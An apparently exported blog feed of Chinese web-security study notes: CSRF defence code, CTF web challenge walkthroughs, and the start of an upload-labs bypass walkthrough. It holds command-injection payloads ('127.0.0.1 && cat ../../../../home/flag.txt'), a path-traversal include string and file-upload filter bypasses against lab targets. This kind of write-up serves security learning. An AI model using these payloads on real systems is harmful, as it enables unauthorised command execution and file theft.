<h6 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h6><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。<br> 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
<h5 id="防御实例"><a href="#防御实例" class="headerlink" title="防御实例"></a>防御实例</h5><h6 id="Sailajs框架中的JavaScript-代码示例"><a href="#Sailajs框架中的JavaScript-代码示例" class="headerlink" title="Sailajs框架中的JavaScript 代码示例"></a>Sailajs框架中的JavaScript 代码示例</h6><p>下面将以 JavaScript 为例，对上述三种方法分别用代码进行示例。</p>
<p>1.验证 Referer</p>
</li>
</ul>
  <figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从 HTTP 头中取得 Referer 值</span></span><br><span class="line"> <span class="keyword">var</span> referer=req.headers.Referer; </span><br><span class="line"> <span class="comment">// 判断 Referer 是否以 test.example 开头</span></span><br><span class="line"> <span class="keyword">if</span>((referer!=<span class="literal">null</span>) &amp;&amp; (_.startsWith(referer, “test.example ”))&#123; </span><br><span class="line">    <span class="comment">// 验证通过</span></span><br><span class="line"> &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="comment">// 验证失败，返回错误</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>  2.验证请求中的 token</p>
  <figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> session = req.session;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 从 session 中得到 csrftoken 属性</span></span><br><span class="line"><span class="keyword">var</span>  token = session.csrftoken; </span><br><span class="line"><span class="keyword">if</span>(token == <span class="literal">null</span>)&#123; </span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 产生新的 token 放入 session 中</span></span><br><span class="line">   token = generateToken(); </span><br><span class="line">   token.csrftoken = token ; </span><br><span class="line">  <span class="keyword">return</span> ....</span><br><span class="line">&#125; <span class="keyword">else</span>&#123; </span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 从 HTTP 头中取得 csrftoken </span></span><br><span class="line">   <span class="keyword">var</span>  token = req.headers.csrftoken; </span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 从请求参数中取得 csrftoken </span></span><br><span class="line">   <span class="keyword">var</span>  xhrToken = req.param(<span class="string">&#x27;csrftoken&#x27;</span>); </span><br><span class="line">   <span class="keyword">if</span>(token != <span class="literal">null</span> &amp;&amp; xhrToken != <span class="literal">null</span> &amp;&amp; token.equals(xhrToken))&#123; </span><br><span class="line">      <span class="keyword">return</span> ...</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">       <span class="keyword">return</span> ...  <span class="comment">// ERROR</span></span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>HTTP 头中自定义属性(网上例子)</li>
</ol>
  <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> plainXhr = dojo.xhr; </span><br><span class="line"></span><br><span class="line"> <span class="comment">// 重写 dojo.xhr 方法</span></span><br><span class="line"> dojo.xhr = <span class="function"><span class="keyword">function</span>(<span class="params">method,args,hasBody</span>) </span>&#123; </span><br><span class="line">    <span class="comment">// 确保 header 对象存在</span></span><br><span class="line">    args.headers = args.header || &#123;&#125;; </span><br><span class="line">        </span><br><span class="line">    tokenValue = <span class="string">&#x27;&lt;%=request.getSession(false).getAttribute(&quot;csrftoken&quot;)%&gt;&#x27;</span>; </span><br><span class="line">    <span class="keyword">var</span> token = dojo.getObject(<span class="string">&quot;tokenValue&quot;</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 把 csrftoken 属性放到头中</span></span><br><span class="line">    args.headers[<span class="string">&quot;csrftoken&quot;</span>] = (token) ? token : <span class="string">&quot;  &quot;</span>; </span><br><span class="line">    <span class="keyword">return</span> plainXhr(method,args,hasBody); </span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>

<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>  CSRF 是一种危害非常大的攻击，又很难以防范。目前几种防御策略虽然可以很大程度上抵御 CSRF 的攻击，但并没有一种完美的解决方案。一些新的方案正在研究之中，比如对于每次请求都使用不同的动态口令，把 Referer 和 token 方案结合起来，甚至尝试修改 HTTP 规范，但是这些新的方案尚不成熟，要正式投入使用并被业界广为接受还需时日。在这之前，我们只有充分重视 CSRF，根据系统的实际情况选择最合适的策略，这样才能把 CSRF 的危害降到最低.</p>
<h4 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h4><p>Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
</IMG></IMG></IMG>]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>新手区</title>
    <url>/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
    <content><![CDATA[<h4 id="View-source"><a href="#View-source" class="headerlink" title="View_source"></a>View_source</h4><p>直接进入查看器查看；</p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(59).png"></p>
<h4 id="Get-post"><a href="#Get-post" class="headerlink" title="Get_post"></a>Get_post</h4><p>浅谈HTTP中GET、POST用法以及它们的区别</p>
<p>来自 <a href="https://www.cnblogs.com/williamjie/p/9099940.html">https://www.cnblogs.com/williamjie/p/9099940.html</a> </p>
<p>解题过程：get ：在路径后直接添加?a=1;</p>
<p>​           post: 勾选post data ，填入b=2.</p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(73).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(75).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(76).png"></p>
<h4 id="Robots"><a href="#Robots" class="headerlink" title="Robots"></a>Robots</h4><p>1.查看协议：路径后添加robots.txt来查看；</p>
<p>2.发现得到语句:</p>
<p>User-agent: *<br>Disallow:<br>Disallow: f1ag_1s_h3re.php</p>
<p>(此地无银) 直接构造语句来访问网站根目录下.php文件</p>
<p>添加f1ag_1s_h3re.php。</p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(60).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(61).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(62).png"></p>
<h4 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h4><p>php的备份有两种：*.php~和*.php.bak</p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(63).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(64).png"></p>
<p>来自 <a href="https://www.cnblogs.com/yunqian2017/p/11515443.html">https://www.cnblogs.com/yunqian2017/p/11515443.html</a> </p>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>抓包配合火狐使用</p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(65).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(66).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(67).png"></p>
<p>来自 &lt;<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1</a></p>
<h4 id="Disabled-button"><a href="#Disabled-button" class="headerlink" title="Disabled_button"></a>Disabled_button</h4><p>直接编辑修改：题目为disabled那就用小聪明将它改成abled。</p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(68).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(69).png"></p>
<h4 id="Weak-auth"><a href="#Weak-auth" class="headerlink" title="Weak auth"></a>Weak auth</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(78).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(79).png"></p>
<h4 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple php"></a>Simple php</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(71).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(72).png"></p>
<h4 id="Xff-referer"><a href="#Xff-referer" class="headerlink" title="Xff_referer"></a>Xff_referer</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(80).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(81).png"></p>
<h4 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(82).png"></p>
<h4 id="Command-execution"><a href="#Command-execution" class="headerlink" title="Command_execution"></a>Command_execution</h4><p>1、打开题目 2、掌握有关命令执行的知识 windows 或 linux 下: command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command</p>
<p>2 command1 | command2 只执行 command2 command1 &amp; command2 先执行 command2 后执行 command1 command1 || command2 先执行 command1，如果为假，再执行 command2 命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符） </p>
<p>3、执行一个 ping 带一个其他命令试试，果然能看到当前目录下的文件 3、到上一级目录看看有啥 127.0.0.1 &amp;&amp; ls ../ </p>
<p>4、找到 home 目录，看看 home 目录下有些啥，发现 flag 文件</p>
<p> 5、利用 cat 命令打开 flag 文件，127.0.0.1 &amp;&amp; cat ../../../../home/flag.txt，得到 fl</p>
<h4 id="Simple-js"><a href="#Simple-js" class="headerlink" title="Simple.js"></a>Simple.js</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(83).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(84).png"></p>
<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(85).png"></p>
<p>之后再将数字·对照ASCII码即可。</p>
]]></content>
      <tags>
        <tag>攻防世界_web</tag>
      </tags>
  </entry>
  <entry>
    <title>端口</title>
    <url>/2021/01/24/web/%E7%AB%AF%E5%8F%A3/</url>
    <content><![CDATA[<p>80端口，443端口</p>
<p>80端口是为<a href="https://baike.baidu.com/item/HTTP">HTTP</a>[超文本传输协议]开放的，此为上网冲浪使用次数最多的协议，主要用于WWW（World Wide Web）即万维网传输信息的协议。（来自百度）</p>
<p>可以通过HTTP地址（即常说的“网址”）加“: 80”来访问网站，因为浏览网页服务默认的<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7/10883658">端口号</a>都是80，因此只需输入网址即可，不用输入“: 80”了。(来自百度)</p>
<p>443端口：https默认调用443端口，向443发请求，80端口拿数据；传输时注意加密算法，加密算法需要分享，</p>
<p>1.浏览器提交支持的加密算法列表</p>
<p>2.服务器收到请求，下发一个加密算法</p>
<p>3.摘要算法，将一段数据加密得到密文（摘要）</p>
<p>签名：对于一个内容，认可数据，认证机制，认可摘要（防篡改）</p>
<p>原本的数据+摘要+算法——&gt;数据防篡改——&gt;真正包含了签名的</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>进阶区</title>
    <url>/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
    <content><![CDATA[<h4 id="Baby-web"><a href="#Baby-web" class="headerlink" title="Baby_web"></a>Baby_web</h4><p>访问index.php,跳转后回到页面，考虑使用抓包，进行repeater，go后在头部看到 flag。</p>
<p>或者直接查看</p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(93).png"></p>
<h4 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h4><p>老套路</p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(94).png"></p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(95).png"></p>
<h4 id="Php-rce"><a href="#Php-rce" class="headerlink" title="Php_rce"></a>Php_rce</h4><p>神奇的PHPv5框架存在漏洞利用，采用路径更改（像Linux指令）进行访问</p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(96).png"></p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(97).png"></p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(98).png"></p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(99).png"></p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(100).png"></p>
<p><a href="https://www.wrpzkb.cn/rce/#post-comment">https://www.wrpzkb.cn/rce/#post-comment</a></p>
<p><a href="https://www.cnblogs.com/sallyzhang/p/12408774.html">https://www.cnblogs.com/sallyzhang/p/12408774.html</a></p>
<h4 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h4><p>文件包含漏洞</p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(101).png"></p>
<p><a href="https://blog.csdn.net/nicesa/article/details/106325437">https://blog.csdn.net/nicesa/article/details/106325437</a></p>
<h4 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h4><h4 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h4><h4 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h4><p>这是2018强网杯的题目</p>
<p>打开是大大的滑稽</p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/5bdb0d93dc794.jpg"></p>
<p>查看下页面源码，发现很多函数</p>
<p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(119).png"></p>
<p>观察源码发现hint.php，打开发现flag not here, and flag in ffffllllaaaagggg，观察到如果满足相应的条件，最后是include引入文件，所以这个信息很有用。我们只需使emmm::checkFile($_REQUEST[‘file’]返回值为true，利用…/跳转目录读取flag即可</p>
<p>观察checkFile函数，几个if语句并列，只要我们满足其中一个true,即有返回值，便不需要往下继续执行了</p>
<p>第一个截取的代码就是关键点，代码要求输入的必须拥有白名单中的内容，我们直接可以在第一次截取时匹配到白名单的内容，接下来一匹配即可返回true</p>
<p>第一个截取的代码就是关键点，代码要求输入的必须拥有白名单中的内容，我们直接可以在第一次截取时匹配到白名单的内容，接下来一匹配即可返回true</p>
<h4 id="NeswCent这块相当于C语言里面的main函数，上面部分的内容相当于定义了一个函数，那个函数在main函数里面被调用，先看看main函数长啥样。首先上传一个file，file必须满足三个条件才能继续执行下去："><a href="#NeswCent这块相当于C语言里面的main函数，上面部分的内容相当于定义了一个函数，那个函数在main函数里面被调用，先看看main函数长啥样。首先上传一个file，file必须满足三个条件才能继续执行下去：" class="headerlink" title="NeswCent这块相当于C语言里面的main函数，上面部分的内容相当于定义了一个函数，那个函数在main函数里面被调用，先看看main函数长啥样。首先上传一个file，file必须满足三个条件才能继续执行下去："></a>NeswCent这块相当于C语言里面的main函数，上面部分的内容相当于定义了一个函数，那个函数在main函数里面被调用，先看看main函数长啥样。首先上传一个file，file必须满足三个条件才能继续执行下去：</h4><p>1.file必须不为空<br>2.file必须是字符串<br>3.file在执行emmm::checkFile函数后返回值必须为True。</p>
<p>接下来利用/使source.php?成为一个不存在的目录，最后include利用…/跳转目录读取flag即可<br>?file=source.php?/…/…/…/…/…/ffffllllaaaagggg</p>
<h4 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h4><h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><h4 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h4><h4 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h4><h4 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h4><p>不是用图片马绕过，而是删除限制代码</p>
<h4 id="nizhuansiwei"><a href="#nizhuansiwei" class="headerlink" title="nizhuansiwei"></a>nizhuansiwei</h4><p><a href="https://blog.csdn.net/RABCDXB/article/details/113733607">https://blog.csdn.net/RABCDXB/article/details/113733607</a> 解题</p>
<p><a href="https://blog.csdn.net/nzjdsds/article/details/82461043">https://blog.csdn.net/nzjdsds/article/details/82461043</a>  php伪协议</p>
<p>正则：preg_match  序列化操作</p>
<h4 id="Web-python-template"><a href="#Web-python-template" class="headerlink" title="Web python template"></a>Web python template</h4><p><a href="https://www.cnblogs.com/darklee/p/12625742.html%E8%A7%A3%E9%A2%98">https://www.cnblogs.com/darklee/p/12625742.html解题</a></p>
<p>相关网址<a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p>
<h4 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web php unserialize"></a>Web php unserialize</h4><h4 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h4><h4 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h4>]]></content>
      <tags>
        <tag>攻防世界_web</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2021/02/21/upload-labs/upload-labs/</url>
    <content><![CDATA[<p> 转载于：<a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">https://blog.csdn.net/weixin_44677409/article/details/92799366</a> 作者：小白白@</p>
<p>（不懂为什么里面一些关卡的方法作者可以绕过，而我就是提示不可以上传该文件类型，伤脑筋。。）</p>
<p>（经过不断失败后，明白原因了：与配置文件php.ini有关，需要修改配置；其次文件缺失，因为可能从网络上白获取的文件吧，好多版本存在关卡不足、对应关卡源代码不对等问题，现在来看在训练的三个靶场中，SQL labs是后期难度最大、时间最长得了。）</p>
<p><img src="https://img-blog.csdnimg.cn/20190619151237843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-1-js检查"><a href="#Pass-1-js检查" class="headerlink" title="Pass-1-js检查"></a>Pass-1-js检查</h2><p><strong>源码：</strong><br><img src="https://img-blog.csdnimg.cn/20190618192730245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>因为是前端js校验，因此可以直接禁用js<br>或者用burp抓包修改文件类型（上传1.jpg修改为1.php）<br><img src="https://img-blog.csdnimg.cn/20190618201625999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618201727918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-2-只验证Content-type"><a href="#Pass-2-只验证Content-type" class="headerlink" title="Pass-2-只验证Content-type"></a>Pass-2-只验证Content-type</h2><p><strong>源码：</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20190618202240670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>仅仅判断content-type类型，因此上传1.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif</p>
<p><img src="https://img-blog.csdnimg.cn/20190618202602681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019061820285334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-3-黑名单绕过"><a href="#Pass-3-黑名单绕过" class="headerlink" title="Pass-3-黑名单绕过"></a>Pass-3-黑名单绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728</span></span><br></pre></td></tr></table></figure>

<p>用黑名单不允许上传<code>.asp,.aspx,.php,.jsp</code>后缀的文件<br>但可以上传<code>.phtml .phps .php5 .pht</code><br>前提是apache的httpd.conf中有如下配置代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>因此抓包修改为1.php5上传，回复包里有上传路径<br><img src="https://img-blog.csdnimg.cn/20190618205539849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618205914362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-4-htaccess绕过"><a href="#Pass-4-htaccess绕过" class="headerlink" title="Pass-4-.htaccess绕过"></a>Pass-4-.htaccess绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span 